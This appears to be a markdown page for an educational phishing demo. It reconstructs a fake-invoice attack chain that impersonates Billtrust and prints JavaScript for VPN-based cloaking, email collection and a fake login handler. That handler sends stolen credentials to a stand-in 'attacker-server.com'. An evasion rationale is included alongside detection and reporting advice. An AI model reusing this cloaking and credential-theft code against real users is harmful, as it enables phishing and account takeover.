# 🎭 Complete Phishing Flow Demo

## ⚠️ EDUCATIONAL ONLY - DO NOT USE FOR MALICIOUS PURPOSES

This is an **exact replica** of the billtrust.cam phishing attack chain you described, recreated for security education and awareness.

---

## 🔗 Live Demo

**URL:** https://invoice-system-7fc.pages.dev/phishing-flow-demo

---

## 📊 The Complete Attack Chain

### **Step 1: Landing Page (billtrust.cam/)**
- **VPN Detection:** Checks visitor's IP address
- **Innocent Front:** VPN users see "Legal Zahirco" legitimate business site
- **Real Target:** Non-VPN users redirected to `/Inv.html`

**Code:**
```javascript
async function detectVPNAndRedirect() {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    
    const isVPN = data.org.toLowerCase().includes('vpn');
    
    if (isVPN) {
        showInnocentPage(); // Show clean content
    } else {
        window.location.href = '/Inv.html'; // Redirect to phishing
    }
}
```

---

### **Step 2: Email Collection (billtrust.cam/Inv.html)**
- **Fake Invoice Page:** Looks like Billtrust invoice
- **Email Collection:** "Enter your email to view invoice"
- **Pass to Final Stage:** Email sent via URL parameter

**Code:**
```javascript
function collectEmailAndRedirect() {
    const email = document.getElementById('email').value;
    
    const finalURL = 'https://invoicedueremotes.z23.web.core.windows.net/' +
                     '?cfg=' + encodeURIComponent(email);
    
    window.location.href = finalURL;
}
```

---

### **Step 3: Credential Theft (Azure Blob Storage)**
- **URL:** `https://invoicedueremotes.z23.web.core.windows.net/?cfg=victim@example.com`
- **Pre-filled Email:** From URL parameter
- **Password Capture:** Fake login form
- **Data Exfiltration:** Sends credentials to attacker
- **Redirect:** Victim sent to real billtrust.com

**Code:**
```javascript
function stealCredentials() {
    const email = urlParams.get('cfg');
    
    document.getElementById('loginForm').onsubmit = async (e) => {
        e.preventDefault();
        
        // Send stolen data to attacker
        await fetch('https://attacker-server.com/collect', {
            method: 'POST',
            body: JSON.stringify({
                email: email,
                password: password,
                timestamp: new Date().toISOString()
            })
        });
        
        // Redirect to real site
        window.location.href = 'https://billtrust.com';
    };
}
```

---

## 🎯 Why This Multi-Step Approach?

### **1. Evade Detection**
- ✅ VPN detection blocks security scanners
- ✅ Multi-domain chain harder to trace
- ✅ Azure blob hosting looks legitimate
- ✅ Each step looks innocent when analyzed alone

### **2. Verify Real Users**
- ✅ Email collection proves human engagement
- ✅ Bots won't fill out forms
- ✅ Filters out automated security scans
- ✅ Only committed victims proceed

### **3. Stay Online Longer**
- ✅ Main domain shows clean content to researchers
- ✅ Abuse reports can't reproduce the attack
- ✅ Azure hosting harder to take down
- ✅ Final URL can be changed easily

---

## 🧪 Interactive Demo Features

### **Try Each Step:**

1. **VPN Detection Test**
   - Simulate VPN user → See innocent content
   - Simulate real user → Redirect to invoice page

2. **Email Collection**
   - Enter fake email
   - See how it's passed to Azure blob

3. **Credential Theft**
   - See pre-filled email
   - Enter fake password
   - Watch credentials being "stolen"

### **Code Analysis:**
- Full source code displayed for each step
- Commented explanations
- Copy-paste ready examples

---

## 🛡️ Defense & Detection

### **How to Detect This Attack:**

1. **URL Verification**
   - Check exact domain: `billtrust.cam` ≠ `billtrust.com`
   - Look for suspicious TLDs (.cam, .xyz, etc.)

2. **Multi-Step Behavior**
   - Legitimate sites don't redirect through multiple domains
   - Azure blob storage shouldn't host login pages

3. **Email Pre-filling**
   - Legitimate sites don't pre-fill emails from URL parameters
   - `?cfg=email@example.com` is suspicious

4. **Use Security Tools**
   - Anti-phishing browser extensions
   - URL scanners (VirusTotal, URLScan)
   - Check with our tool: https://invoice-system-7fc.pages.dev/anti-cloaking

---

## 🔗 Related Resources

| Resource | URL |
|----------|-----|
| **Phishing Flow Demo** | https://invoice-system-7fc.pages.dev/phishing-flow-demo |
| **Anti-Cloaking Tool** | https://invoice-system-7fc.pages.dev/anti-cloaking |
| **Cloaking Techniques** | https://invoice-system-7fc.pages.dev/cloaking-demo |
| **Billtrust Analysis** | https://invoice-system-7fc.pages.dev/billtrust-analysis.md |
| **Original HTML Source** | https://invoice-system-7fc.pages.dev/billtrust-sample.html |

---

## ⚠️ Security Warnings

### **DO NOT:**
- ❌ Use this code for actual phishing attacks
- ❌ Target real individuals or organizations
- ❌ Modify for malicious purposes
- ❌ Deploy without educational context

### **DO:**
- ✅ Use for security research
- ✅ Educate others about phishing threats
- ✅ Test your own security systems
- ✅ Report real phishing sites to authorities

---

## 📧 Reporting Real Phishing

If you encounter real phishing sites:

1. **Report to the Impersonated Company**
   - abuse@billtrust.com (for Billtrust phishing)

2. **Report to Hosting Providers**
   - Azure abuse: abuse@microsoft.com
   - Domain registrars

3. **Report to Security Organizations**
   - PhishTank: https://phishtank.org/
   - Google Safe Browsing
   - Anti-Phishing Working Group (APWG)

---

## 🎓 Educational Use Cases

### **For Security Professionals:**
- Phishing awareness training
- Red team exercises
- Security tool testing
- Attack chain analysis

### **For Organizations:**
- Employee security training
- Incident response preparation
- Email filtering rule development
- Security awareness campaigns

---

## 📝 Technical Details

### **Attack Chain Summary:**

```
Email with fake invoice link
        ↓
billtrust.cam/ (VPN detection)
        ↓
    [VPN?] → YES → Innocent "Legal Zahirco" page
        ↓
        NO
        ↓
billtrust.cam/Inv.html (Email collection)
        ↓
Enter email address
        ↓
invoicedueremotes.z23.web.core.windows.net/?cfg=email
        ↓
Fake login form (pre-filled email)
        ↓
Enter password
        ↓
Credentials sent to attacker
        ↓
Redirect to real billtrust.com
```

---

## 🚀 Try the Demo Now!

**Live Demo:** https://invoice-system-7fc.pages.dev/phishing-flow-demo

**Features:**
- Interactive 3-step walkthrough
- Real-time code analysis
- Side-by-side comparisons
- Educational warnings
- Copy-paste code examples

---

**Last Updated:** February 10, 2026  
**Status:** ✅ LIVE AND WORKING  
**Purpose:** Educational security research only
